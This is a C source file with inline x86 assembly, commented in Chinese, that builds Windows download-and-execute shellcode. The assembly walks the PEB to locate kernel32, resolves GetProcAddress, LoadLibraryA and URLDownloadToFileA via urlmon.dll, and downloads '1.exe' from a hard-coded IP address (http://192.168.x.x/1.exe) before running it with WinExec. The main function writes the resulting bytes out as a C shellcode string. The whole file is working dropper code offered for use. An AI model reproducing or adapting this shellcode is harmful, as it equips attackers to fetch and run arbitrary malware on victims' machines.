
#include <stdio.h>

unsigned char* asm_code()
{
	__asm
	{
		lea eax, __code
		jmp __ret
	}

	//这里放shellcode的汇编代码
	__asm
	{
	__code:
		; 获取kernel32.dll入口地址
			xor ecx, ecx
			mov eax, fs: [ecx + 0x30] ; EAX = PEB
			mov eax, [eax + 0xc]; EAX = PEB->Ldr
			mov esi, [eax + 0x14]; ESI = PEB->Ldr.InMemOrder  dll双端链表head
			lodsd; EAX = Second module
			xchg eax, esi; EAX = ESI, ESI = EAX; 此时esi中是第一个模块的起点list
			lodsd; EAX = Third(kernel32)
			mov ebx, [eax + 0x10]; EBX = Base address

			; 查找kernel32.dll的导出表
			mov edx, [ebx + 0x3c]; EDX = DOS->e_lfanew
			add edx, ebx; EDX = PE Header 加上基地址获取绝对地址
			mov edx, [edx + 0x78]; EDX = Offset export table
			add edx, ebx; EDX = Export table
			mov esi, [edx + 0x20]; ESI = Offset namestable
			add esi, ebx; ESI = Names table
			xor ecx, ecx; EXC = 0; ecx用于Get_Function的循环技计数

			; 查找GetProcAddress函数名
			Get_Function :
		inc ecx; Increment the ordinal
			lodsd; Get name offset
			add eax, ebx; Get function name

			cmp dword ptr[eax], 0x50746547; GetP; 判断是不是GetProcAddress
			jnz Get_Function
			cmp dword ptr[eax + 0x4], 0x41636f72; rocA
			jnz Get_Function
			cmp dword ptr[eax + 0x8], 0x65726464; ddre
			jnz Get_Function

			mov esi, [edx + 0x24]; ESI = Offset ordinals
			add esi, ebx; ESI = Ordinals table
			mov cx, [esi + ecx * 2]; Number of function 序号表中存储的word是相对地址 只需两个字节 cx就是函数序号
			dec ecx
			mov esi, [edx + 0x1c]; Offset address table
			add esi, ebx; ESI = Address table
			mov edx, [esi + ecx * 4]; EDX = Pointer(offset)  GetProcAddress起始地址的相对地址
			add edx, ebx; EDX = GetProcAddress

			; 已经找到GetProcAddress的起始地址 寻找LoadLibraryA起始地址
			xor ecx, ecx; ECX = 0
			push ebx; Kernel32 base address
			push edx; GetProcAddress
			push ecx; 0
			push 0x41797261; aryA
			push 0x7262694c; Libr
			push 0x64616f4c; Load

			push esp; "LoadLibrary"
			push ebx; Kernel32 base address
			call edx; GetProcAddress(LL); 调用GetProcAddress函数寻找LoadLibrary  call函数自己清理调用栈的入栈参数  返回值存储于eax

			add esp, 0xc; pop "LoadLibrary" 函数执行完成后进行清理工作
			pop ecx
			pop edx
			pop ebx

			push ebx; ke32dll函数执行前保存寄存器中内容
			push edx; getproceaddr
			push 0x00006c6c
			push 0x642e6e6f
			push 0x6d6c7255
			push esp; "Urlm on.d ll"
			call eax; LoadLibrary("Urlm on.d ll"); 调用LoadLibraryA函数载入msvcrt.dll
			add esp, 0xc; pop "Urlm on.d ll"
			pop edx; GetProcAddress函数地址
			pop ebx; k32基地址

			push ebx; 使用GetProcAddress函数获取URLDownloadToFileA函数地址
			push edx
			push 0x00004165; 存储"URLDownloadToFileA"
			push 0x6c69466f
			push 0x5464616f
			push 0x6c6e776f
			push 0x444c5255
			push esp
			push eax
			call edx; 调用调用GetProcAddress函数寻找URLDownloadToFileA   eax中已经存储函数地址
			add esp, 0x14; pop "URLDownloadToFileA"
			pop edx
			pop ebx

			push ebx; 调用URLDownloadToFileA
			push edx
			push 0x00000065; 存储"1.exe"
			push 0x78652e31
			push 0x00657865; 存储"http://192.168..."
			push 0x2e312f30
			push 0x33312e36
			push 0x382e3836
			push 0x312e3239
			push 0x312f2f3a
			push 0x70747468
			push 0; 传参以及调用函数
			push 0
			xor ebx, ebx
			lea ebx, [esp + 24h]
			push ebx
			xor ebx, ebx
			lea ebx, [esp + 0ch]
			push ebx
			push 0
			call eax
			add esp, 0x24; 清理栈push的字符串
			pop edx
			pop ebx


			push ebx; 查找WinExec函数地址
			push edx
			push 0x00636578
			push 0x456e6957
			push esp
			push ebx; kernel32函数的基地址
			call edx
			add esp, 0x8
			pop edx
			pop ebx

			; 调用WinExec函数
			push 0x00000065; 存储"1.exe"
			push 0x78652e31
			push 8
			lea ebx, [esp + 4h]
			push ebx
			call eax
			add esp, 0x8; 清理压栈的字符串
	}


	//函数结语
	__asm int 3
	__asm { __ret: }
}

void main()
{
	unsigned char temp;
	int i = 1;
	unsigned char* asm_p = asm_code();
	FILE* fd = fopen("code.txt", "w");
	fprintf(fd, "unsigned char shellcode = \"");
	while ((temp = *asm_p) != 0xcc)
	{
		fprintf(fd, "\\x%.2x", temp);
		asm_p++;
		if (i % 8 == 0) fprintf(fd, "\"\n\"");
		i++;
	}
	fprintf(fd, "\";");
	fclose(fd);
}